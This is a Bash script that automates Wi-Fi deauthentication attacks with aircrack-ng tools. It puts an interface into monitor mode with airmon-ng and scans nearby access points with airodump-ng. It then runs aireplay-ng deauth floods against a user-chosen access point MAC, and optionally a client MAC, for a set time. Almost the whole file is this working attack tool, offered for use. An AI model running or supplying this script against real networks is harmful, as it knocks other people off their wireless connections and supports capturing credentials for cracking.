#!/bin/bash

function userProvided() { #Data user will enter.
		cat myOutput-01.csv | awk '{ print $1,$6,$19 }' | awk 'NR==1,/Station/' | head -n -1 #printing out results of the scan with the macaddr and channel number
		echo "Which of the Mac addresses would you like to use?"
		read macaddr
		echo "Which channel would you like to use?"
		read channelNum
		echo "How long would you like to do the deauth attack? (in seconds)" & read time
}

function scriptOver() { #just created function so I can just call it. This function resets everything once the intial script is over.
	echo "Returning everything to normal" 
	sleep 2
	clear
	rm -f *myOutput*

	airmon-ng stop $interface
	service NetworkManager start
	service wpa_supplicant start
	ifconfig $interface down
	ifconfig $interface up
	echo "Goodbye!" 
       	sleep 3
	clear
	exit 0
}

echo "Which interface would you like to put into monitor mode?"
read interface
if [[ `iwconfig|grep $interface` ]] &>/dev/null; then #checking to make sure interface name is actually the name of an interface.
	sleep 2
	echo "Checking to make sure linux see's the network adapter ...... "
	sleep 2
	lsusb|grep -i realtek #checking to see if Linux sees the adapter at all 
	sleep 2
	iwconfig|grep -i realtek #checking to make sure Linux sees the usb as a network adapter
	echo  "Done!"

	airmon-ng check kill #kill wifi processes
	airmon-ng start $interface #puts selected interface into monitor mode
	#iwconfig
	airodump-ng $interface -w myOutput --output-format csv & sleep 15
	kill %1 #killing the previous command.
	
	echo -e 'Pick an Option (1-3)\n'
 
	echo '1.	Deauth with NO client MAC'
	echo '2.	Deauth WITH client MAC'
	echo '3.	Exit the program'

	
	read response
		
	case $response in 

		1) #if user selected to Deauth with NO client MAC
			userProvided 
			aireplay-ng -0 0 -a $macaddr $interface & sleep $time
			pkill aireplay-ng
			scriptOver
			;;
		2) #if user selected option to Deauth WITH client MAC.
			userProvided
			echo "Please provide the Client MAC."
			read clientMac
			aireplay-ng -0 0 -a $macaddr -c $clientMac $interface & sleep $time
			pkill aireplay-ng
			scriptOver
			;;
		3) #if user selected option to leave (option 3)
			scriptOver
			;;
	esac

else
	echo "This interface does not exsist try again with an actual interface name!"
	exit 0
fi


#For future
#Create Ctrl-C escape sequence so user is not left in monitor mode.
